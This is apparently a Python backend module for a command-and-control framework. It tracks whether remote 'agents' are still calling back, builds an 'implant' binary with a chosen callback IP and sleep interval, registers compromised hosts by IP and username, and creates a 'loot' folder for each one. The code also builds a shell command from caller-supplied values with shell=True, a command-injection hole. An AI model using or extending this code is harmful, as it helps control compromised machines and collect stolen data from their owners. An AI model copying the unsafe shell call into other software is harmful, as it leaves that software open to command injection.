import os
import subprocess
import models
from datetime import datetime, timedelta


def check_agent_alive():
    agents = models.db.session.query(models.Agent).all()
    for agent in agents:
        last_seen = agent.lastSeen
        last_seen = datetime.strptime(last_seen, '%d %B, %Y %H:%M:%S')
        curr_time = datetime.now()
        elapsed = curr_time - last_seen
        agent_expected = timedelta(seconds=(agent.sleepTime*2))
        if elapsed > agent_expected:
            agent.isAlive = False
        else:
            agent.isAlive = True
        models.db.session.flush()
        models.db.session.commit()


def build_implant(ip="127.0.0.1", sleepTime="0"):
    """Builds the binary using the user provided config values

    :param ip: The callback IP address, defaulted at localhost
    :type ip: str
    :param sleepTime: The amount of time the implant should wait to callback
    :type sleepTime: str
    :returns: none
    :rtype: None
    """
    subprocess.Popen(
                    [f"../implant/payloads/make.sh -h {ip} -s {sleepTime}"],
                    shell=True
    )


def add_agent(agent_dict):
    """Adds an agent to the backend database

    :param agent_dict: A dictionary containing all the agent information
    :type agent_dict: dict
    :returns: the ID of the new agent :rtype: int
    """
    # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])
    # ).scalar():
    args = [str(agent_dict['Stats'][key]) for key in agent_dict['Stats']]
    args += [str(agent_dict['total'])]
    args += [agent_dict['IP']]
    args += [agent_dict['USERNAME']]
    args += [agent_dict['SleepTime']]
    agent = models.Agent(*args)
    models.db.session.add(agent)
    models.db.session.flush()
    agent_id = agent.id
    print(agent_id)
    models.db.session.commit()
    print(agent_id)
    os.mkdir(f"loot/agent_{agent_id}")
    return agent.id
